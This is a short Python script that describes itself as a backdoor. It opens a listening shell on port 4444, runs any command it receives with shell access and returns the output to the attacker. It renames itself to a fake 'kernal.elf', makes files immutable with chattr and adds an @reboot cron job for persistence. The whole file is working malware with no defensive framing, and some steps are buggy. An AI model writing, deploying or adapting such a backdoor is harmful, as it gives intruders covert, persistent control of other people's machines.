import os
import socket
import subprocess
import time
import base64
import zlib

# Backdoor parameters (target machine's IP and port)
host = '0.0.0.0'  # Bind to all available interfaces on the target machine
port = 4444       # Listening port for the backdoor on the target machine

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the host and port (target machine's IP and port)
s.bind((host, port))

# Listen for incoming connections
s.listen(1)
print(f"Backdoor created and listening on {host}:{port}")

# Anti-forensics
script_path = os.path.abspath(__file__)
os.system(f'mv "{script_path}" kernal.elf')
os.system('chattr +i *')

# Modify file timestamps to hide execution traces
for file in os.listdir():
    os.utime(file, (time.time(), time.time()))

# Persistence
if os.name == 'posix':  # Linux
    script_path = os.path.abspath(__file__)  # Get the absolute path of the current script
    os.system(f'(crontab -l 2>/dev/null; echo "@reboot {script_path}") | crontab -')

# Function to handle client connections and execute commands
def handle_connection(client_socket):
    while True:
        # Receive commands from the attacker
        command = client_socket.recv(1024).decode()

        if command.lower() == 'quit':
            client_socket.close()
            break

        # Execute the received command and capture the output
        output = subprocess.run(command, shell=True, capture_output=True)
        client_socket.send(output.stdout)  # Send command output back to the attacker

# Main loop to accept and handle incoming connections
while True:
    client_socket, address = s.accept()  # Accept incoming connections
    print(f"Connection from {address}")
    handle_connection(client_socket)

# Close the backdoor socket (this will never be reached in normal operation)
s.close()
